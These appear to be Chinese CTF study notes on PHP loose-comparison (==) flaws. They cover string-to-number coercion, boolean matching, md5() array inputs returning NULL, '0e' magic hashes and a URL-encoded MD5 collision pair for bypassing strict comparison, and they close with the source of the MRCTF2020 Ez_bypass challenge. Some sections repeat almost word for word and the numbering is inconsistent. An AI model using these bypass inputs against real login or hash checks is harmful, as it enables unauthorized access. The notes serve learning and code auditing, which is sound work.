当一个**数字**和一个**字符串**用 `==` 比较时，PHP 会尝试把字符串转成数字。

- **规则**：PHP 会从字符串的**开头**开始找数字。如果开头有数字，就截取出来；如果开头没数字，就当做 `0`。
- **例子**：
  - `123 == "123"` → `true`（很正常）
  - `123 == "123admin"` → `true` （**坑！** PHP 提取了开头的 `123`，忽略了后面的字母）
  - `0 == "admin"` → `true` （**大坑！** 因为 `admin` 开头没数字，被转成了 `0`）

#### 2.布尔值（True/False）

这是最危险的一种。如果比较的一方是 `true`，PHP 会把另一方也转成布尔值。

- **规则**：除了 `0`、空字符串 `""`、空数组 `[]`、`null` 之外，**几乎所有的东西转成布尔值都是 `true`**。
- **例子**：
  - `true == "any_string"` → `true`
  - `true == 123` → `true`
- **应用场景**：如果后端代码写的是 `if($password == true)`，你随便输入什么字符串都能直接登录。

PHP 的弱类型比较（`==`）里的“坑”非常多，除了**科学计数法（0e）**，还有好几种让人哭笑不得的“自作聪明”。

在 PHP 8.0 之前，这些规则非常混乱，但在 CTF 比赛或旧代码审计中，你经常会遇到以下几种类型：

### 1. 字符串与数字比较（最常见的坑）

当一个**数字**和一个**字符串**用 `==` 比较时，PHP 会尝试把字符串转成数字。

- **规则**：PHP 会从字符串的**开头**开始找数字。如果开头有数字，就截取出来；如果开头没数字，就当做 `0`。
- **例子**：
  - `123 == "123"` → `true`（很正常）
  - `123 == "123admin"` → `true` （**坑！** PHP 提取了开头的 `123`，忽略了后面的字母）
  - `0 == "admin"` → `true` （**大坑！** 因为 `admin` 开头没数字，被转成了 `0`）

------

### 2. 十六进制字符串转换

在旧版本的 PHP（PHP 5）中，如果字符串看起来像十六进制（以 `0x` 开头），比较时也会自动转成十进制数字。

- **例子**：`"0x1e" == "30"` → `true`
  - 解析：`0x1e` 是十六进制的 30，PHP 自动帮你在后台转好了。
  - *注：这种特性在 PHP 7 中已被移除，但在老题目中依然会出现。*

------

### 3. 布尔值（True/False）的“万能匹配”

这是最危险的一种。如果比较的一方是 `true`，PHP 会把另一方也转成布尔值。

- **规则**：除了 `0`、空字符串 `""`、空数组 `[]`、`null` 之外，**几乎所有的东西转成布尔值都是 `true`**。
- **例子**：
  - `true == "any_string"` → `true`
  - `true == 123` → `true`
- **应用场景**：如果后端代码写的是 `if($password == true)`，你随便输入什么字符串都能直接登录。

#### 3. 数组（Array）的特殊处理

正如我之前提到的，有些函数（比如 `md5()`）不接受数组。

- **情况**：如果你给 `md5()` 传一个数组，比如 `md5([])`，PHP 会报一个警告，并返回 **`null`**。
- **逻辑绕过**：

```
// 如果代码是这样：
if (md5($a) == md5($b))
```

你传入 `a[]=1&b[]=2`。 计算结果变成：`NULL == NULL` → **结果为 `true`**。 这种方法不仅能绕过科学计数法的 `0e`，甚至能绕过**强类型比较 `===`**。



#### 4. NULL、0、空字符串

这三者在 `==` 下是“三位一体”的。

- `0 == ""` → `true`
- `0 == "0"` → `true`
- `0 == null` → `true`
- `false == ""` → `true`



#### 5.科学计数法

当 PHP 执行 `if ("0e123" == "0e456")` 时，它的大脑里发生了如下对话：

1. **PHP**：“左边是一个字符串 `0e123`，右边是一个字符串 `0e456`。”
2. **PHP**：“咦？等等，这两位长得好像科学计数法啊！左边 0×10 的 123 次方是 0，右边 0×10 的 456 次方也是 0。”
3. **PHP**：“既然它们在数学上都等于数字 0，那它们肯定就是相等的啦！”
4. **结果**：返回 `true`。





3.强比较绕过

根据有无string看，是否可以数组绕过

https://blog.csdn.net/m0_73818134/article/details/131793815

例子：

a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2





## [MRCTF2020]Ez_bypass

### 1





```
I put something in F12 for you include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
	$id=$_GET['id'];
	$gg=$_GET['gg'];
	if (md5($id) === md5($gg) && $id !== $gg) {
		echo 'You got the first step';
		if(isset($_POST['passwd'])) {
			$passwd=$_POST['passwd'];
			if (!is_numeric($passwd)) {
				if($passwd==1234567) {
					echo 'Good Job!';
					highlight_file('flag.php');
					die('By Retr_0');
				} else {
					echo "can you think twice??";
				}
			} else {
				echo 'You can not get it !';
			}
		} else {
			die('only one way to get the flag');
		}
	} else {
		echo "You are not a real hacker!";
	}
} else {
	die('Please input first');
}
}
Please input first
```

